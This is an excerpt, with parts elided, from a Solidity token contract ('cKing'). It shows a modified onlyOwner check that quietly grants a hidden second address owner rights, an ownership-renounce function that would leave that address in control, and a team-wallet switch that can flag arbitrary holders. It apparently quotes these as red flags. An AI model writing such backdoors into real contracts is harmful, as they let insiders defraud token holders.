...
contract Ownable is Context {
    ...
    modifier onlyOwner() {
        require(_msgSender()   ==  ownerAdd || _owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }
    
    function TruthwaiveOwnership() public onlyOwner {
...
contract cKing is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "New Community King";
    string private _symbol = "cKing";
    ...
    function writeAntiwhale(address recipient, bool value) external { 
        require( msg.sender==teamWalletAddress);
        _isAntiwhaleed[recipient] = value;
    }
